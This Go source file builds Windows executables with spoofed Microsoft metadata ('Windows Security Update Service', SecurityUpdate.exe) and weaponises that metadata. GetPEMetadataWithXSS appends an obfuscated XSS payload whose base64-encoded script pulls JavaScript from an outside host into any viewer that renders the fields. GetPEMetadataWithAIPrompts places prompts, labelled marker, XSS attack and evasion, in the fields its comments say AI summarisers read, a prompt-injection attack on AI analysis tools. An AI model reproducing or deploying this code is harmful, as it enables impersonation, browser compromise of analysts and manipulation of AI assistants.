package xss

import (
	"fmt"
)

// Metadata del PE que se embebe durante la compilación
// Estos strings quedan en el binario y aparecen en análisis estático

var (
	// Metadata que aparece en propiedades del archivo
	CompanyName      = `Microsoft Corporation`
	FileDescription  = `Windows Security Update Service`
	ProductName      = `Microsoft Windows Operating System`
	FileVersion      = `10.0.19041.1234`
	InternalName     = `SecurityUpdate.exe`
	LegalCopyright   = `Copyright (C) Microsoft Corporation. All rights reserved.`
	OriginalFilename = `SecurityUpdate.exe`
	ProductVersion   = `10.0.19041.1234`
)

// EmbedPEMetadata embebe metadata en el binario
// Nota: Para que esto funcione completamente, necesitas usar ldflags en compilación
func EmbedPEMetadata() {
	// Los strings quedan embebidos en el binario
	_ = CompanyName
	_ = FileDescription
	_ = ProductName
	_ = FileVersion
	_ = InternalName
	_ = LegalCopyright
	_ = OriginalFilename
	_ = ProductVersion
}

// GetPEMetadataWithXSS retorna metadata con XSS para embeber
func GetPEMetadataWithXSS(callbackServer string, payloadID string) map[string]string {
	// Payload específico solicitado
	specificPayload := `"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlbGVhc2VzLmxpZmUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>`

	return map[string]string{
		"CompanyName":      fmt.Sprintf(`Microsoft Corporation%s`, specificPayload),
		"FileDescription":  fmt.Sprintf(`Windows Update%s`, specificPayload),
		"ProductName":      fmt.Sprintf(`Microsoft Windows%s`, specificPayload),
		"InternalName":     fmt.Sprintf(`SecurityUpdate%s`, specificPayload),
		"OriginalFilename": fmt.Sprintf(`Update.exe%s`, specificPayload),
	}
}

// GetPEMetadataWithAIPrompts retorna metadata diseñada para confundir a la IA
func GetPEMetadataWithAIPrompts(prompts []AIPrompt) map[string]string {
	// Mapeamos los prompts a campos que las IAs suelen leer para generar resúmenes
	meta := make(map[string]string)

	// FileDescription es el campo más leído por las IAs
	if len(prompts) > 0 {
		meta["FileDescription"] = prompts[0].Content // El Marcador
		meta["Comments"] = prompts[1].Content        // El Ataque XSS
		meta["LegalTrademarks"] = prompts[2].Content // La Evasión
	}
	return meta
}

// EmbedXSSStrings embebe strings adicionales con XSS en el binario
func EmbedXSSStrings(payloads []XSSPayload) {
	// Crear array de strings que quedarán en el binario
	var embeddedStrings []string

	for _, p := range payloads {
		if p.Vector == "pe-metadata" {
			// Embeber el contenido del payload
			embeddedStrings = append(embeddedStrings, p.Content)

			// Embeber variantes
			embeddedStrings = append(embeddedStrings,
				fmt.Sprintf("CompanyName: %s", p.Content),
				fmt.Sprintf("FileDescription: %s", p.Content),
				fmt.Sprintf("ProductName: %s", p.Content),
			)
		}
	}

	// Los strings quedan embebidos
	_ = embeddedStrings
}

// PrintPEMetadata imprime la metadata embebida (para debug)
func PrintPEMetadata() {
	fmt.Println("\n[PE Metadata]")
	fmt.Printf("  CompanyName: %s\n", CompanyName)
	fmt.Printf("  FileDescription: %s\n", FileDescription)
	fmt.Printf("  ProductName: %s\n", ProductName)
	fmt.Printf("  FileVersion: %s\n", FileVersion)
	fmt.Println()
}
